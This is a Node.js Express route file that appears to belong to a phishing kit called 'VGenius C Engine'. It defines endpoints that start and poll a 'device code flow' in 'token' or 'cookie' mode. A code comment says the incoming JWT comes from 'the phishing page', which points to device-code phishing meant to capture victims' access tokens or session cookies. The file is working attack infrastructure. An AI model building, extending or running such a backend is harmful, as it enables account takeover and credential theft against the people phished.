/**
 * VGenius C Engine – Device Proxy Routes
 * Handles /api/device/start and /api/device/status/:job_id
 */

const express = require('express');
const router = express.Router();
const deviceProxy = require('../services/deviceproxy');

/**
 * POST /api/device/start
 * Start a new device code flow
 * Body: { mode: "token" | "cookie" }
 * Headers: X-Auth-Mode, X-VG-JWT (the phishing page's JWT)
 */
router.post('/start', async (req, res) => {
  try {
    const mode = req.body.mode || req.headers['x-auth-mode'] || 'cookie';
    const jwtToken = req.body.jwt_token || req.headers['x-vg-jwt'] || req.query.token;

    if (!jwtToken) {
      return res.status(400).json({ error: 'JWT token required' });
    }

    const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
    const result = await deviceProxy.startDeviceFlow(mode, jwtToken, apiBaseUrl);

    res.json(result);
  } catch (err) {
    console.error('[Device] Start error:', err.message);
    res.status(500).json({ error: 'Failed to start device flow', message: err.message });
  }
});

/**
 * GET /api/device/status/:job_id
 * Poll for device code flow status
 */
router.get('/status/:job_id', async (req, res) => {
  try {
    const { job_id } = req.params;
    const result = deviceProxy.getJobStatus(job_id);
    res.json(result);
  } catch (err) {
    console.error('[Device] Status error:', err.message);
    res.status(500).json({ error: 'Failed to get status' });
  }
});

module.exports = router;
